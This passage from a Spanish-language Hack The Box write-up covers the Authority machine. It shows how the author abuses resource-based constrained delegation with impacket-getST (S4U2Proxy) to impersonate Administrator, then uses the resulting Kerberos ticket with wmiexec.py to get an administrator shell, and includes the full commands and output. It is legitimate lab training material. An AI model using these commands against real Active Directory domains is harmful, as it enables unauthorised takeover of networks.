Después de configurar la delegación RBCD correctamente, utilizamos **`impacket-getST`** para obtener el **`Ticket Granting Ticket (TGT)`** del usuario **`Administrator`** y luego lo usamos para suplantarlo. Ejecutamos el siguiente comando para obtener el ticket y realizar la suplantación mediante **`S4U2Proxy`.**

Este proceso genera el ticket Kerberos necesario y lo guarda en el archivo **`Administrator@cifs_AUTHORITY.authority.htb@AUTHORITY.HTB.ccache`**. A continuación, usamos el ticket para ejecutar un comando **`wmiexec.py`** y obtener acceso remoto a la máquina **`AUTHORITY`.**

Esto nos otorga acceso con privilegios de **`htb\administrator`**. Al ejecutar **`whoami`**, verificamos que hemos conseguido los permisos de **`Administrator`**. También usamos el comando **`ipconfig`** para obtener detalles de la red, confirmando que la máquina `AUTHORITY` tiene la IP `10.10.11.222`.

Con esto, logramos una escalada de privilegios exitosa utilizando `RBCD` a través de `PassTheCert` y Kerberos.

<pre class="language-bash"><code class="lang-bash">❯ impacket-getS<a data-footnote-ref href="#user-content-fn-1">T</a> -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator -dc-ip 10.10.11.222 'authority.htb'/'rbcd_gzzcoo$':'Gzzcoo123' 2>/dev/null
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_AUTHORITY.authority.htb@AUTHORITY.HTB.ccache

❯ KRB5CCNAME=Administrator@cifs_AUTHORITY.authority.htb@AUTHORITY.HTB.ccache wmiexec.py authority.htb/Administrator@AUTHORITY.authority.htb -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator

C:\>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::b2
   IPv6 Address. . . . . . . . . . . : dead:beef::2bfa:d203:fefe:9258
   Link-local IPv6 Address . . . . . : fe80::3dc8:5e09:6a49:d0ec%8
   IPv4 Address. . . . . . . . . . . : 10.10.11.222
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6791%8
                                       10.10.10.2
</code></pre>

[^1]: 
